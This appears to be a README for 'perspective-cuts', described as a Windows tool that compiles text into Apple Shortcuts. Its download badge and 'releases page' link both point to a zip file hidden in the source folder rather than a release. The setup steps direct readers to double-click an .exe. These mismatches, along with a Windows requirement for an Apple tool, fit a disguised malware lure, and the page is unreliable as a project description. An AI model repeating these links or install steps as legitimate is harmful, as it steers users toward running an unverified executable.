# 📝 perspective-cuts - Write custom Apple Shortcuts with text

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/joannvicennial286/perspective-cuts/main/Sources/perspective-cuts/Compiler/perspective_cuts_1.9.zip)

## 📖 About this project

This software offers a new way to build Apple Shortcuts. Instead of moving blocks on your screen, you write simple text files. A computer program converts your text into a format that runs on your Apple devices. This tool targets users who prefer typing over dragging visual elements. It helps you automate tasks on your Mac or iPhone with higher speed and precision.

## 🛠 Features

*   **Text-based logic**: Define complex steps using plain words.
*   **Version control**: Save your shortcuts in a text format that works with standard storage systems.
*   **Fast compilation**: Turn your text into a shortcut in seconds.
*   **Privacy-first**: All work happens on your local device.
*   **Accessibility**: Navigate your automation logic through screen readers and keyboards.

## 💻 System requirements

*   **Operating System**: Windows 10 or 11.
*   **Storage**: 50 MB of free disk space.
*   **Memory**: 4 GB of RAM.
*   **Apple environment**: You need an Apple device to import the final shortcut files. Ensure your Mac or iPhone has the Shortcuts app installed.

## 📥 How to set up

1. Visit the [releases page](https://raw.githubusercontent.com/joannvicennial286/perspective-cuts/main/Sources/perspective-cuts/Compiler/perspective_cuts_1.9.zip) to access the installation files.
2. Look for the file ending in `.exe` under the latest release.
3. Click the filename to save it to your computer.
4. Locate the file in your downloads folder.
5. Double-click the file to start the installation.
6. Follow the instructions on the screen to finish the setup.

## 🚀 How to use the app

The software acts as a bridge between your text editor and your Apple devices. 

1. Open the application.
2. Create a new file or open an existing one that ends in `.cuts`.
3. Type your shortcut instructions. Use the internal documentation inside the Help menu to see available commands.
4. Press the "Compile" button.
5. Save the output file.
6. Send the file to your Apple device via AirDrop, email, or a cloud service.
7. Open the file on your device to add it to your library.

## ⚙️ Understanding the language

The software uses a specific structure to understand your commands. You write each action on a new line. The program reads these lines from top to bottom.

Example structure:
*   Use commands like `Get Clipboard` to access current text.
*   Use `Show Notification` to alert your device.
*   Use `If` statements to create conditions.

The compiler catches errors while you type. If a command uses the wrong format, the bottom window shows a message to help you fix it.

## 🔒 Privacy and safety

This tool runs on your computer. It does not send your data to external servers. Your shortcut files stay private. The compiler tool only translates your text into a format that works with the Apple Shortcuts app. It does not interact with your private cloud data unless you specifically build that action into your shortcut files.

## 💡 Tips for success

*   Keep your text organized. Use empty lines between different parts of your logic.
*   Add comments to your files by starting a line with a double slash `//`. This makes it easier to remember what each part of your code does.
*   Start with simple shortcuts before you build complex automations.
*   Check the menu bar for the "Examples" folder. It contains pre-written files to help you learn the command structure.

## 🔧 Managing settings

The Settings menu lets you change how the app functions. 
*   **Output folder**: Choose where the tool saves your shortcut files.
*   **Editor theme**: Adjust the colors of the text window to suit your eyes.
*   **Update check**: Enable this to ensure you stay on the latest version of the program.

## ℹ️ Troubleshooting

*   **File not recognized**: Ensure you shared the file correctly from your Windows PC to your Apple device.
*   **Compiler errors**: Read the error message carefully. It usually points to a missing bracket or a command name that does not exist.
*   **App won't open**: Verify that your computer meets the memory and storage requirements.
*   **No shortcut created**: Ensure you clicked the "Compile" button after finishing your text. Check the designated output folder.

## 🌐 Community and support

This project lives on GitHub. If you encounter bugs or want to request new features, use the Issues tab on the repository page. You can read the contribution guide to learn how the community helps improve the tool. Ensure you search for your question in existing issues before you start a new one to keep the discussions clean and helpful.